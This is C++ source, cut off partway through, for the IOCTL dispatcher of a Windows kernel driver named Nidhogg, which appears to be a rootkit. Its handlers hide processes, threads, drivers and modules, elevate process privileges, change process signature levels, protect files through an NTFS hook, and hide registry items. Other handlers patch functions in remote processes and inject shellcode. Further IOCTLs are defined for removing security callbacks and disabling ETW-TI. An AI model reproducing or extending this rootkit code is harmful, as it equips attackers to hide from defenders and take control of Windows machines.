#pragma once
#include "pch.h"
#include "MemoryAllocator.hpp"

#define VALID_SIZE(DataSize, StructSize)(DataSize != 0 && DataSize % StructSize == 0)

// ** IOCTLS **********************************************************************************************
#define IOCTL_PROTECT_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_UNHIDE_PROCESS CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ELEVATE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PROTECT_UNPROTECT_THREAD CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PROTECT_UNPROTECT_FILE CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_QUERY_FILES CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PROTECT_REGITEM CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_QUERY_REGITEMS CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PATCH_MODULE CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INJECT_SHELLCODE CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_INJECT_DLL CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_MODULE CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_LIST_PSROUTINES CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_REMOVE_RESTORE_CALLBACK CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_HIDE_UNHIDE_DRIVER CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
// *******************************************************************************************************

/*
* Description:
* NidhoggDeviceControl is responsible for handling IOCTLs and returning output to the user via IRPs.
* Every user communication should go through this function using the relevant IOCTL.
*
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Not used.
* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]		 -- Whether the function succeeded or not, if not the error code.
*/
NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T len = 0;
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	// IoGetRequestorProcess() --> Then check the PreviousMode of that process to understand if it is UM or KM.


	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_PROTECT_UNPROTECT_PROCESS:
	{
		ProtectedProcess protectedProcess{};

		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ProtectedProcess))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProtectedProcess*)Irp->AssociatedIrp.SystemBuffer;
		protectedProcess.Pid = data->Pid;
		protectedProcess.Protect = data->Protect;

		if (!VALID_PROCESS(protectedProcess.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (protectedProcess.Protect) {
			if (NidhoggProccessUtils->GetProtectedProcessesCount() == MAX_PIDS) {
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}

			if (NidhoggProccessUtils->FindProcess(protectedProcess.Pid))
				break;

			if (!NidhoggProccessUtils->AddProcess(protectedProcess.Pid)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", protectedProcess.Pid));
		}
		else {
			if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0) {
				status = STATUS_NOT_FOUND;
				break;
			}

			if (!NidhoggProccessUtils->RemoveProcess(protectedProcess.Pid)) {
				status = STATUS_NOT_FOUND;
				break;
			}

			KdPrint((DRIVER_PREFIX "Unprotecting process with pid %d.\n", protectedProcess.Pid));
		}
		
		len += sizeof(ProtectedProcess);
		break;
	}

	case IOCTL_CLEAR_PROCESS_PROTECTION:
	{
		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		NidhoggProccessUtils->ClearProtectedProcesses();

		break;
	}

	case IOCTL_HIDE_UNHIDE_PROCESS:
	{
		HiddenProcess hiddenProcess{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(HiddenProcess))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (HiddenProcess*)Irp->AssociatedIrp.SystemBuffer;
		hiddenProcess.Pid = data->Pid;
		hiddenProcess.Hide = data->Hide;

		if (!VALID_PROCESS(hiddenProcess.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (hiddenProcess.Hide) {
			status = NidhoggProccessUtils->HideProcess(hiddenProcess.Pid);

			if (NT_SUCCESS(status))
				KdPrint((DRIVER_PREFIX "Hid process with pid %d.\n", hiddenProcess.Pid));
		}
		else {
			status = NidhoggProccessUtils->UnhideProcess(hiddenProcess.Pid);

			if (NT_SUCCESS(status))
				KdPrint((DRIVER_PREFIX "Unhide process with pid %d.\n", hiddenProcess.Pid));
		}

		len += sizeof(HiddenProcess);
		break;
	}

	case IOCTL_ELEVATE_PROCESS:
	{
		ULONG pid = 0;
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ULONG))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
		MemoryAllocator<ULONG*> allocator(&pid, sizeof(ULONG), PagedPool);
		allocator.CopyData(data, sizeof(ULONG));

		if (!VALID_PROCESS(pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggProccessUtils->ElevateProcess(pid);

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", pid));

		len += sizeof(ULONG);
		break;
	}

	case IOCTL_SET_PROCESS_SIGNATURE_LEVEL:
	{
		ProcessSignature processSignature{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ProcessSignature))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProcessSignature*)Irp->AssociatedIrp.SystemBuffer;
		processSignature.Pid = data->Pid;
		processSignature.SignatureSigner = data->SignatureSigner;
		processSignature.SignerType = data->SignerType;

		if (!VALID_PROCESS(processSignature.Pid) ||
			(processSignature.SignatureSigner < PsProtectedSignerNone || processSignature.SignatureSigner > PsProtectedSignerMax) ||
			(processSignature.SignerType < PsProtectedTypeNone || processSignature.SignerType > PsProtectedTypeProtected)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggProccessUtils->SetProcessSignature(&processSignature);

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "New signature applied to %d.\n", data->Pid));

		len += sizeof(ProcessSignature);
		break;
	}

	case IOCTL_QUERY_PROTECTED_PROCESSES:
	{
		if (!Features.ProcessProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ProtectedProcessesList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProtectedProcessesList*)Irp->AssociatedIrp.SystemBuffer;

		NidhoggProccessUtils->QueryProtectedProcesses(data);

		len += sizeof(ProtectedProcessesList);
		break;
	}

	case IOCTL_PROTECT_UNPROTECT_THREAD:
	{
		ProtectedThread protectedThread{};

		if (!Features.ThreadProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ProtectedThread))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProtectedThread*)Irp->AssociatedIrp.SystemBuffer;
		protectedThread.Tid = data->Tid;
		protectedThread.Protect = data->Protect;

		if (protectedThread.Tid <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (protectedThread.Protect) {
			if (NidhoggProccessUtils->GetProtectedThreadsCount() == MAX_TIDS) {
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}

			if (NidhoggProccessUtils->FindThread(protectedThread.Tid))
				break;

			if (!NidhoggProccessUtils->AddThread(protectedThread.Tid)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			KdPrint((DRIVER_PREFIX "Protecting thread with tid %d.\n", protectedThread.Tid));
		}
		else {
			if (NidhoggProccessUtils->GetProtectedThreadsCount() == 0) {
				status = STATUS_NOT_FOUND;
				break;
			}

			if (!NidhoggProccessUtils->RemoveThread(protectedThread.Tid)) {
				status = STATUS_NOT_FOUND;
				break;
			}

			KdPrint((DRIVER_PREFIX "Unprotecting thread with tid %d.\n", protectedThread.Tid));
		}

		len += sizeof(ProtectedThread);
		break;
	}

	case IOCTL_HIDE_THREAD:
	{
		ULONG tid = 0;
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ULONG))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
		MemoryAllocator<ULONG*> allocator(&tid, sizeof(ULONG), PagedPool);
		status = allocator.CopyData(data, sizeof(ULONG));

		if (!NT_SUCCESS(status))
			break;

		if (tid <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggProccessUtils->HideThread(tid);

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Hid thread with tid %d.\n", tid));

		len += sizeof(ULONG);
		break;
	}

	case IOCTL_CLEAR_THREAD_PROTECTION:
	{
		if (!Features.ThreadProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		NidhoggProccessUtils->ClearProtectedThreads();
		break;
	}

	case IOCTL_QUERY_PROTECTED_THREADS:
	{
		if (!Features.ThreadProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ThreadsList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ThreadsList*)Irp->AssociatedIrp.SystemBuffer;
		NidhoggProccessUtils->QueryProtectedThreads(data);

		len += sizeof(ThreadsList);
		break;
	}

	case IOCTL_PROTECT_UNPROTECT_FILE:
	{
		ProtectedFile protectedFile{};

		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ProtectedFile))) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ProtectedFile*)Irp->AssociatedIrp.SystemBuffer;
		MemoryAllocator<WCHAR*> allocator(protectedFile.FilePath, MAX_PATH * sizeof(WCHAR), PagedPool);
		SIZE_T filePathLen = wcslen(data->FilePath);
		status = allocator.CopyData(data->FilePath, filePathLen * sizeof(WCHAR));

		if (!NT_SUCCESS(status))
			break;

		if (!protectedFile.FilePath || wcslen(protectedFile.FilePath) > MAX_PATH) {
			KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (protectedFile.Protect) {
			if (NidhoggFileUtils->GetFilesCount() == MAX_FILES) {
				KdPrint((DRIVER_PREFIX "List is full.\n"));
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}

			if (!NidhoggFileUtils->FindFile(protectedFile.FilePath)) {
				if (!NidhoggFileUtils->AddFile(protectedFile.FilePath)) {
					KdPrint((DRIVER_PREFIX "Failed to add file.\n"));
					status = STATUS_UNSUCCESSFUL;
					break;
				}

				if (!NidhoggFileUtils->IsCallbackActivated(0)) {
					status = NidhoggFileUtils->InstallNtfsHook(IRP_MJ_CREATE);

					if (!NT_SUCCESS(status)) {
						NidhoggFileUtils->RemoveFile(protectedFile.FilePath);
						KdPrint((DRIVER_PREFIX "Failed to hook ntfs.\n"));
						break;
					}
				}

				auto prevIrql = KeGetCurrentIrql();
				KeLowerIrql(PASSIVE_LEVEL);
				KdPrint((DRIVER_PREFIX "Protecting file %ws.\n", protectedFile.FilePath));
				KeRaiseIrql(prevIrql, &prevIrql);
			}
		}
		else {
			if (!NidhoggFileUtils->RemoveFile(protectedFile.FilePath)) {
				status = STATUS_NOT_FOUND;
				break;
			}

			if (NidhoggFileUtils->GetFilesCount() == 0) {
				status = NidhoggFileUtils->UninstallNtfsHook(IRP_MJ_CREATE);

				if (!NT_SUCCESS(status))
					KdPrint((DRIVER_PREFIX "Failed to restore the hook.\n"));
			}

			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Unprotected file %ws.\n", protectedFile.FilePath));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += sizeof(ProtectedFile);
		break;
	}

	case IOCTL_CLEAR_FILE_PROTECTION:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		NidhoggFileUtils->ClearFilesList();
		break;
	}

	case IOCTL_QUERY_FILES:
	{
		if (!Features.FileProtection) {
			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(FileItem))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (FileItem*)Irp->AssociatedIrp.SystemBuffer;
		status = NidhoggFileUtils->QueryFiles(data);

		len += sizeof(FileItem);
		break;
	}

	case IOCTL_PROTECT_REGITEM:
	{
		RegItem regItem{};
		ULONG itemsCount = 0;

		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(RegItem))) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
		regItem.Type = data->Type;
		SIZE_T keyLen = wcslen(data->KeyPath);

		if (keyLen == 0 || keyLen > REG_KEY_LEN) {
			KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);

		if (err != 0) {
			KdPrint((DRIVER_PREFIX "Failed to copy to buffer.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (regItem.Type == RegProtectedValue || regItem.Type == RegHiddenValue) {
			SIZE_T valueLen = wcslen(data->ValueName);

			if (valueLen == 0 || valueLen > REG_VALUE_LEN) {
				KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);

			if (err != 0) {
				KdPrint((DRIVER_PREFIX "Failed to copy to buffer.\n"));
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}

		switch (regItem.Type) {
		case RegProtectedKey:
			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
			break;
		case RegHiddenKey:
			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
			break;
		case RegProtectedValue:
			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
			break;
		case RegHiddenValue:
			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
			break;
		default:
			KdPrint((DRIVER_PREFIX "Unknown registry object type.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(status))
			break;
		
		if (itemsCount == MAX_REG_ITEMS) {
			KdPrint((DRIVER_PREFIX "List is full.\n"));
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!NidhoggRegistryUtils->FindRegItem(&regItem)) {
			if (!NidhoggRegistryUtils->AddRegItem(&regItem)) {
				KdPrint((DRIVER_PREFIX "Failed to add new registry item.\n"));
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			KdPrint((DRIVER_PREFIX "Added new registry item of type %d.\n", regItem.Type));
		}

		len += sizeof(RegItem);
		break;
	}

	case IOCTL_UNPROTECT_REGITEM:
	{
		RegItem regItem{};

		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(RegItem))) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
		regItem.Type = data->Type;
		SIZE_T keyLen = wcslen(data->KeyPath);

		if (!VALID_REG_TYPE(regItem.Type) || keyLen == 0 || keyLen > REG_KEY_LEN) {
			KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);

		if (err != 0) {
			KdPrint((DRIVER_PREFIX "Failed to copy to buffer.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (regItem.Type == RegProtectedValue || regItem.Type == RegHiddenValue) {
			SIZE_T valueLen = wcslen(data->ValueName);

			if (valueLen == 0 || valueLen > REG_VALUE_LEN) {
				KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);

			if (err != 0) {
				KdPrint((DRIVER_PREFIX "Failed to copy to buffer.\n"));
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}

		if (!NidhoggRegistryUtils->RemoveRegItem(&regItem)) {
			KdPrint((DRIVER_PREFIX "Registry item not found.\n"));
			status = STATUS_NOT_FOUND;
			break;
		}

		len += sizeof(RegItem);
		break;
	}

	case IOCTL_CLEAR_REGITEMS:
	{
		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		NidhoggRegistryUtils->ClearRegItems();
		break;
	}

	case IOCTL_QUERY_REGITEMS:
	{
		ULONG itemsCount = 0;

		if (!Features.RegistryFeatures) {
			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(RegItem))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;

		switch (data->Type) {
			case RegProtectedKey:
				itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
				break;
			case RegHiddenKey:
				itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
				break;
			case RegProtectedValue:
				itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
				break;
			case RegHiddenValue:
				itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
				break;
			default:
				status = STATUS_INVALID_PARAMETER;
				break;
		}

		if (!NT_SUCCESS(status) || itemsCount == 0 || data->RegItemsIndex > itemsCount) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggRegistryUtils->QueryRegItem(data);

		len += sizeof(RegItem);
		break;
	}

	case IOCTL_PATCH_MODULE:
	{
		PatchedModule patchedModule{};

		if (!Features.FunctionPatching) {
			KdPrint((DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(PatchedModule))) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (PatchedModule*)Irp->AssociatedIrp.SystemBuffer;
		patchedModule.Pid = data->Pid;
		patchedModule.PatchLength = data->PatchLength;

		SIZE_T strSize = strlen(data->FunctionName);
		MemoryAllocator<CHAR*> functionNameAllocator(patchedModule.FunctionName, strSize, PagedPool);
		status = functionNameAllocator.CopyData(data->FunctionName, strSize);

		if (!NT_SUCCESS(status))
			break;

		strSize = wcslen(data->ModuleName) * sizeof(WCHAR);
		MemoryAllocator<WCHAR*> moduleNameAllocator(patchedModule.ModuleName, strSize, PagedPool);
		status = moduleNameAllocator.CopyData(data->ModuleName, strSize);

		if (!NT_SUCCESS(status))
			break;

		MemoryAllocator<PVOID> patchAllocator(patchedModule.Patch, data->PatchLength, PagedPool);
		status = patchAllocator.CopyData(data->Patch, data->PatchLength);

		if (!NT_SUCCESS(status))
			break;

		if (!VALID_PROCESS(data->Pid)) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggMemoryUtils->PatchModule(&patchedModule);

		if (NT_SUCCESS(status)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += sizeof(PatchedModule);
		break;
	}

	case IOCTL_HIDE_MODULE:
	{
		HiddenModuleInformation hiddenModule{};

		if (!Features.ModuleHiding) {
			KdPrint((DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(HiddenModuleInformation))) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (HiddenModuleInformation*)Irp->AssociatedIrp.SystemBuffer;
		hiddenModule.Pid = data->Pid;
		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);
		MemoryAllocator<WCHAR*> moduleNameAllocator(hiddenModule.ModuleName, moduleNameSize, PagedPool);
		status = moduleNameAllocator.CopyData(data->ModuleName, moduleNameSize);

		if (!NT_SUCCESS(status))
			break;

		if (!VALID_PROCESS(hiddenModule.Pid)) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = NidhoggMemoryUtils->HideModule(&hiddenModule);

		if (NT_SUCCESS(status)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			KdPrint((DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid));
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += sizeof(HiddenModuleInformation);
		break;
	}

	case IOCTL_HIDE_UNHIDE_DRIVER:
	{
		HiddenDriverInformation hiddenDriver{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(HiddenDriverInformation))) {
			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (HiddenDriverInformation*)Irp->AssociatedIrp.SystemBuffer;
		hiddenDriver.Hide = data->Hide;
		SIZE_T driverNameSize = wcslen(data->DriverName) * sizeof(WCHAR);
		MemoryAllocator<WCHAR*> driverNameAllocator(hiddenDriver.DriverName, driverNameSize, PagedPool);
		status = driverNameAllocator.CopyData(data->DriverName, driverNameSize);

		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
			break;
		}

		if (hiddenDriver.Hide) {
			if (NidhoggMemoryUtils->GetHiddenDrivers() == MAX_HIDDEN_DRIVERS) {
				KdPrint((DRIVER_PREFIX "Too many items.\n"));
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}

			status = NidhoggMemoryUtils->HideDriver(&hiddenDriver);

			if (NT_SUCCESS(status)) {
				auto prevIrql = KeGetCurrentIrql();
				KeLowerIrql(PASSIVE_LEVEL);
				KdPrint((DRIVER_PREFIX "Hid driver %ws.\n", hiddenDriver.DriverName));
				KeRaiseIrql(prevIrql, &prevIrql);
			}
		}
		else {
			status = NidhoggMemoryUtils->UnhideDriver(&hiddenDriver);

			if (NT_SUCCESS(status)) {
				auto prevIrql = KeGetCurrentIrql();
				KeLowerIrql(PASSIVE_LEVEL);
				KdPrint((DRIVER_PREFIX "Restored driver %ws.\n", hiddenDriver.DriverName));
				KeRaiseIrql(prevIrql, &prevIrql);
			}
		}

		len += sizeof(HiddenDriverInformation);
		break;
	}

	case IOCTL_INJECT_SHELLCODE: 
	{
		ShellcodeInformation shellcodeInfo{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ShellcodeInformation))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ShellcodeInformation*)Irp->AssociatedIrp.SystemBuffer;
		shellcodeInfo.Pid = data->Pid;

		if (!VALID_PROCESS(shellcodeInfo.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		shellcodeInfo.Type = data->Type;
		shellcodeInfo.ShellcodeSize = data->ShellcodeSize;
		shellcodeInfo.Parameter1 = NULL;
		shellcodeInfo.Parameter1Size = data->Parameter1Size;
		shellcodeInfo.Parameter2 = NULL;
		shellcodeInfo.Parameter2Size = data->Parameter2Size;
		shellcodeInfo.Parameter3 = NULL;
		shellcodeInfo.Parameter3Size = data->Parameter3Size;
		MemoryAllocator<PVOID> shellcodeAllocator(shellcodeInfo.Shellcode, shellcodeInfo.ShellcodeSize, PagedPool);
		status = shellcodeAllocator.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);

		if (!NT_SUCCESS(status))
			break;

		// Copy parameters
		if (shellcodeInfo.Parameter1Size > 0) {
			MemoryAllocator<PVOID> parameter1Alloc(shellcodeInfo.Parameter1, shellcodeInfo.Parameter1Size, PagedPool);
			status = parameter1Alloc.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);
		}

		if (!NT_SUCCESS(status))
			break;

		if (shellcodeInfo.Parameter2Size > 0) {
			MemoryAllocator<PVOID> parameter2Alloc(shellcodeInfo.Parameter2, shellcodeInfo.Parameter2Size, PagedPool);
